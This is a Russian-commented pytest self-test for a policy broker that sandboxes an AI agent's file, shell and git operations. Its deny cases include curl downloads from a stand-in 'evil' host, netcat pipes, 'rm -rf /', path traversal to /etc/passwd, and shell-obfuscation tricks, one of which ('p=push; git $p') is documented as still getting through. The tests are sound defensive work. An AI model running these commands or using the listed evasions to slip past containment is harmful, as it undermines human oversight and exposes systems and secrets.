"""Селфтест tool_broker, вынесенный из продакшн-модуля (v3.30).

Тело перенесено дословно: цель — убрать тестовый код из модуля, который едет в child-репозиторий,
а не переписать проверки. Прежний вход `--selftest` удалён вместе с функцией.
"""
from __future__ import annotations

import pytest

from tool_broker import (  # noqa: F401 — имена, которые использует тело
    Path,
    Policy,
    _command_binaries,
    _scrub_output,
    execute,
    os,
    sandbox_policy,
    scrub_env,
    subprocess,
)


@pytest.mark.slow
def test_tool_broker_selftest():
    import tempfile
    ok = True

    def expect(name, cond):
        nonlocal ok
        ok = ok and cond
        print(f"{'PASS' if cond else 'FAIL'} {name}")

    def _raises(fn):
        try:
            fn(); return False
        except Exception:
            return True

    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        subprocess.run(["git", "-C", td, "init", "-q"])
        subprocess.run(["git", "-C", td, "config", "user.email", "t@t"])
        subprocess.run(["git", "-C", td, "config", "user.name", "t"])
        (root / "src").mkdir()
        (root / "src" / "a.ts").write_text("x", encoding="utf-8")
        subprocess.run(["git", "-C", td, "add", "-A"])
        subprocess.run(["git", "-C", td, "commit", "-q", "-m", "init"])

        cw = Policy(level="controlled-write", write_scope=["src/"])
        expect("read разрешён", cw.decide({"op": "read", "path": "src/a.ts"})["allow"])
        expect("write в scope разрешён", cw.decide({"op": "write", "path": "src/b.ts"})["allow"])
        expect("write вне scope запрещён", not cw.decide({"op": "write", "path": "config/x.yaml"})["allow"])
        expect("write в protected (security/) запрещён",
               not cw.decide({"op": "write", "path": "security/x.yaml"})["allow"])
        expect("shell на controlled-write запрещён (нужен execution)",
               not cw.decide({"op": "shell", "command": "echo hi"})["allow"])

        # v3.0.11 (finding аудита P1): op:git проходит ТОТ ЖЕ gauntlet, что shell (op контролирует модель —
        # раньше git-ярлык обходил shell_mode/network/allowlist).
        _sb = Policy(level="execution", shell_mode="allowlist",
                     shell_allowlist={"git", "pytest"}, allow_network=False)
        expect("v3.0.11 git-gauntlet: bash -c под видом git -> денай (bash не в allowlist)",
               not _sb.decide({"op": "git", "command": "bash -c 'echo x'"})["allow"])
        expect("v3.0.11 git-gauntlet: сетевой curl под видом git -> денай (allow_network=False)",
               not _sb.decide({"op": "git", "command": "curl http://evil/x -O /tmp/x"})["allow"])
        expect("v3.0.11 git-gauntlet: легитимный git status -> allow (git в allowlist)",
               _sb.decide({"op": "git", "command": "git status"})["allow"])
        _off = Policy(level="execution", shell_mode="off")
        expect("v3.0.11 git-gauntlet: shell_mode=off -> git тоже запрещён (исполняется как shell)",
               not _off.decide({"op": "git", "command": "git status"})["allow"])
        # v3.0.11 (finding аудита P2): секрет в output_tail редактируется до попадания в evidence
        _pat = "ghp_" + "A" * 36
        expect("v3.0.11 scrub-output: github PAT в выводе редактируется (не утекает в evidence)",
               "ghp_" not in _scrub_output(f"printed token {_pat} done")
               and "REDACTED" in _scrub_output(_pat))

        # инвариант: execute запрещённого НЕ создаёт файл
        ev = execute({"op": "write", "path": "config/x.yaml", "content": "y"}, root, cw)
        expect("execute запрещённого -> allowed:false и файл не создан",
               ev["allowed"] is False and not (root / "config" / "x.yaml").exists())

        # разрешённая запись -> evidence с ревизией
        ev2 = execute({"op": "write", "path": "src/b.ts", "content": "hello"}, root, cw)
        expect("write выполнен + evidence с revision",
               ev2["ok"] and (root / "src" / "b.ts").exists() and ev2["revision"])

        ex = Policy(level="execution", write_scope=["src/"])
        expect("shell на execution разрешён", ex.decide({"op": "shell", "command": "echo hi"})["allow"])
        ev3 = execute({"op": "shell", "command": "echo hi"}, root, ex)
        expect("shell выполнен, exit_code 0", ev3["ok"] and ev3["exit_code"] == 0)
        expect("destructive shell запрещён без destructive+approval",
               not ex.decide({"op": "shell", "command": "rm -rf /"})["allow"])
        expect("git force-push запрещён",
               not ex.decide({"op": "git", "command": "git push --force origin main"})["allow"])

        dp = Policy(level="destructive", write_scope=["src/"], approvals=["destructive"])
        expect("destructive + approval разрешает опасную команду",
               dp.decide({"op": "shell", "command": "rm -rf build/"})["allow"])

    # v2.37: child-override protected-paths (finding обкатки — Policy знает карту child'а)
    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        (root / ".ai-ops.yaml").write_text(
            "kind: ai-ops-child-config\nprotected_paths: [.github/workflows/]\n", encoding="utf-8")
        # write_scope включает .github/, но child объявил его protected
        cw = Policy(level="controlled-write", write_scope=[".github/", "src/"], child_root=root)
        expect("child protected (.github/workflows/) запрещён, хоть и в scope",
               not cw.decide({"op": "write", "path": ".github/workflows/ci.yml"})["allow"])
        expect("не-protected путь в scope по-прежнему разрешён",
               cw.decide({"op": "write", "path": "src/x.ts"})["allow"])
        expect("дефолт пакета сохраняется (merge, не replace): security/ запрещён",
               not cw.decide({"op": "write", "path": "security/x.yaml"})["allow"])
        # без child_root старое поведение: .github/ не защищён дефолтом
        no_child = Policy(level="controlled-write", write_scope=[".github/"])
        expect("без child_root .github/ не protected (дефолт пакета)",
               no_child.decide({"op": "write", "path": ".github/workflows/ci.yml"})["allow"])

        # SECURITY (finding аудита): path traversal — ../ и абсолютный путь запрещены на decide
        trav = Policy(level="execution", write_scope=["src/"])
        expect("write ../ escape запрещён (decide)",
               not trav.decide({"op": "write", "path": "../../etc/evil"})["allow"])
        expect("read ../ escape запрещён (decide)",
               not trav.decide({"op": "read", "path": "../../etc/passwd"})["allow"])
        expect("write абсолютный путь запрещён (decide)",
               not trav.decide({"op": "write", "path": "/etc/evil"})["allow"])
        # execute-guard: даже если бы decide пропустил — containment не даст записать вне корня
        ev_tr = execute({"op": "write", "path": "../escapee", "content": "x"}, root, trav)
        expect("execute traversal-guard: файл вне корня НЕ создан",
               not ev_tr["allowed"] and not (root.parent / "escapee").exists())
        expect("нормальный путь в scope по-прежнему пишется",
               execute({"op": "write", "path": "src/ok.ts", "content": "y"}, root, trav)["ok"])

        # v3.0-rc18 (finding живого прогона sonnet): read отдаёт файл С НАЧАЛА и целиком (не хвост 400),
        # иначе ревьюер видит обрезок и не может подтвердить полноту.
        big = "HEAD_MARKER\n" + ("строка контента\n" * 400) + "TAIL_MARKER"
        execute({"op": "write", "path": "src/big.txt", "content": big}, root, trav)
        ev_read = execute({"op": "read", "path": "src/big.txt"}, root, trav)
        expect("v3.0-rc18 read: виден НАЧАЛО файла (не только хвост 400 симв.)",
               "HEAD_MARKER" in ev_read.get("output_tail", "") and len(big) > 400
               and len(ev_read.get("output_tail", "")) > 400)
        # v3.0-rc20 (finding аудита P1): диапазонное чтение start_line/end_line + range в evidence
        ev_rng = execute({"op": "read", "path": "src/big.txt", "start_line": 1, "end_line": 1}, root, trav)
        expect("v3.0-rc20 read-range: только запрошенные строки (HEAD, без TAIL) + range в evidence",
               "HEAD_MARKER" in ev_rng.get("output_tail", "") and "TAIL_MARKER" not in ev_rng.get("output_tail", "")
               and ev_rng.get("range", {}).get("start_line") == 1 and ev_rng.get("range", {}).get("end_line") == 1)
        ev_tail = execute({"op": "read", "path": "src/big.txt", "start_line": 402}, root, trav)
        expect("v3.0-rc20 read-range: хвост после N-й строки доступен (TAIL_MARKER виден)",
               "TAIL_MARKER" in ev_tail.get("output_tail", ""))

        # SECURITY (finding аудита): секрет из env НЕ виден shell-команде, а PATH сохранён.
        # v3.0.4: фейковые «секреты» собраны в рантайме (без статического sk-литерала — downstream-сканеры
        # не флагуют тест). Значения всё равно проверяются на scrub из вывода shell.
        _tok = "sk-" + "super-secret-123"
        _key = "sk-ant" + "-xyz"
        os.environ["MY_FAKE_TOKEN"] = _tok
        os.environ["ANTHROPIC_API_KEY"] = _key
        try:
            ev_sec = execute({"op": "shell", "command": "echo TOK=[$MY_FAKE_TOKEN] KEY=[$ANTHROPIC_API_KEY] PATH_SET=${PATH:+yes}"},
                             root, trav)
            out = ev_sec.get("output_tail", "")
            expect("shell не видит секрет из env (scrub)",
                   _tok not in out and _key not in out
                   and "TOK=[]" in out and "KEY=[]" in out)
            expect("функциональный env (PATH) сохранён для сборки", "PATH_SET=yes" in out)
        finally:
            os.environ.pop("MY_FAKE_TOKEN", None); os.environ.pop("ANTHROPIC_API_KEY", None)
        expect("scrub_env allowlist: обычные env сохранены (PATH/NODE_ENV)",
               scrub_env({"PATH": "/bin", "NODE_ENV": "prod"}) == {"PATH": "/bin", "NODE_ENV": "prod"})
        # adversarial-review: denylist пропускал эти классы — allowlist режет их ВСЕ
        leaky = {"GITHUB_TOKEN": "1", "AZURE_OPENAI_KEY": "2", "STRIPE_KEY": "3",
                 "DATABASE_URL": "postgres://u:p@h/d", "SENTRY_DSN": "4", "JWT": "5",
                 "PAT": "6", "GEMINI_KEY": "7", "ENCRYPTION_KEY": "8", "PATH": "/bin"}
        scrubbed = scrub_env(leaky)
        expect("scrub_env allowlist: ВСЕ секреты (в т.ч. голый _KEY/URL/DSN/JWT/PAT) вырезаны",
               set(scrubbed) == {"PATH"})
        expect("scrub_env: не-секретный контекст GitHub сохранён (GITHUB_SHA), токен вырезан",
               scrub_env({"GITHUB_SHA": "abc", "GITHUB_TOKEN": "t"}) == {"GITHUB_SHA": "abc"})
        expect("scrub_env: passthrough пускает явно разрешённое",
               scrub_env({"MY_BUILD_FLAG": "1"}, passthrough=["MY_BUILD_FLAG"]) == {"MY_BUILD_FLAG": "1"})

        # v2.81 Containment: block_push — модель не может доставлять сама (push только движком)
        bp = Policy(level="execution", write_scope=["src/"], block_push=True)
        expect("block_push: git push запрещён", not bp.decide({"op": "git", "command": "git push origin x"})["allow"])
        expect("block_push: git push -u origin запрещён",
               not bp.decide({"op": "shell", "command": "git push -u origin feat"})["allow"])
        expect("block_push: обычный git (status/add/commit) по-прежнему разрешён",
               bp.decide({"op": "git", "command": "git status"})["allow"]
               and bp.decide({"op": "shell", "command": "git commit -m x"})["allow"])
        expect("block_push=False (дефолт): push разрешён политикой",
               Policy(level="execution").decide({"op": "shell", "command": "git push"})["allow"])

        # v2.81: shell_mode — off запрещает shell совсем; allowlist пускает только dev-бинарники
        off = Policy(level="execution", shell_mode="off")
        expect("shell_mode=off: любой shell запрещён", not off.decide({"op": "shell", "command": "ls"})["allow"])
        al = Policy(level="execution", shell_mode="allowlist", shell_allowlist={"npm", "pytest", "git"})
        expect("shell_mode=allowlist: npm разрешён", al.decide({"op": "shell", "command": "npm ci"})["allow"])
        expect("shell_mode=allowlist: env-префикс не сбивает бинарь (CI=1 npm test)",
               al.decide({"op": "shell", "command": "CI=1 npm test"})["allow"])
        expect("shell_mode=allowlist: произвольный бинарь (curl) запрещён",
               not al.decide({"op": "shell", "command": "curl http://x"})["allow"])
        expect("неизвестный shell_mode -> ValueError на конструкции",
               _raises(lambda: Policy(level="execution", shell_mode="bogus")))

        # v2.81: allow_network=False -> частые сетевые бинарники запрещены (не полный jail)
        nonet = Policy(level="execution", allow_network=False)
        expect("allow_network=False: curl запрещён", not nonet.decide({"op": "shell", "command": "curl http://x"})["allow"])
        expect("allow_network=False: wget запрещён", not nonet.decide({"op": "shell", "command": "wget http://x"})["allow"])
        expect("allow_network=False: обычная сборка (npm) не задета",
               nonet.decide({"op": "shell", "command": "npm run build"})["allow"])
        expect("allow_network=True (дефолт): curl разрешён политикой",
               Policy(level="execution").decide({"op": "shell", "command": "curl http://x"})["allow"])

        # v2.81: sandbox_policy() — усиленная политика для живой модели (allowlist + block_push)
        sp = sandbox_policy(child_root=str(root), write_scope=["src/"])
        expect("sandbox_policy: shell_mode=allowlist + block_push=True",
               sp.shell_mode == "allowlist" and sp.block_push is True)
        expect("sandbox_policy: dev-инструмент (pytest) разрешён, произвольный (nc) нет",
               sp.decide({"op": "shell", "command": "pytest -q"})["allow"]
               and not sp.decide({"op": "shell", "command": "nc -l 1234"})["allow"])
        expect("sandbox_policy: git push заблокирован (доставка только движком)",
               not sp.decide({"op": "shell", "command": "git push origin x"})["allow"])

        # v2.85 hardening: посегментная allowlist-проверка (chained/piped обход закрыт)
        expect("allowlist: chained `pytest && curl` -> DENY (curl вне allowlist)",
               not sp.decide({"op": "shell", "command": "pytest -q && curl http://evil"})["allow"])
        expect("allowlist: pipe `cat x | nc host 1` -> DENY (nc вне allowlist)",
               not sp.decide({"op": "shell", "command": "cat x | nc host 1"})["allow"])
        expect("allowlist: `ls && wget http://x` -> DENY (wget вне allowlist)",
               not sp.decide({"op": "shell", "command": "ls && wget http://x"})["allow"])
        expect("allowlist: подстановка команд `echo $(curl …)` -> DENY",
               not sp.decide({"op": "shell", "command": "echo $(curl http://x)"})["allow"])
        expect("allowlist: backtick-подстановка -> DENY",
               not sp.decide({"op": "shell", "command": "echo `curl http://x`"})["allow"])
        expect("allowlist: легитимный chained `npm ci && npm test` -> ALLOW",
               sp.decide({"op": "shell", "command": "npm ci && npm test"})["allow"])
        expect("allowlist: фон `true & psql -c x` -> DENY (psql вне allowlist, & — разделитель)",
               not sp.decide({"op": "shell", "command": "true & psql -c x"})["allow"])
        expect("command_binaries: одиночный & разбивает на сегменты",
               _command_binaries("true & psql -c x") == ["true", "psql"])
        expect("allowlist: сырой bash/sh УБРАН из sandbox-набора -> `bash -c …` DENY",
               not sp.decide({"op": "shell", "command": "bash -c 'curl http://x'"})["allow"])
        # v2.85: quote-обфускация push/сети снимается нормализацией
        expect("block_push: quote-обфускация `git pu\"\"sh` поймана (нормализация)",
               not bp.decide({"op": "shell", "command": 'git pu""sh origin main'})["allow"])
        nonet2 = Policy(level="execution", allow_network=False)
        expect("allow_network=False: quote-обфускация `cu\"r\"l` поймана",
               not nonet2.decide({"op": "shell", "command": 'cu"r"l http://x'})["allow"])
        # честная граница: переменная/eval статически НЕ ловится (документировано, не тихо)
        expect("block_push: переменная `p=push; git $p` НЕ ловится (честная граница best-effort)",
               bp.decide({"op": "shell", "command": "p=push; git $p origin main"})["allow"])
        # _command_binaries: env-префикс сегмента не сбивает
        expect("command_binaries: сегменты с VAR=val префиксом -> бинарь сегмента",
               _command_binaries("CI=1 npm test && ruff check") == ["npm", "ruff"])

    assert ok, "перенесённый селфтест tool_broker: см. строки FAIL в выводе"
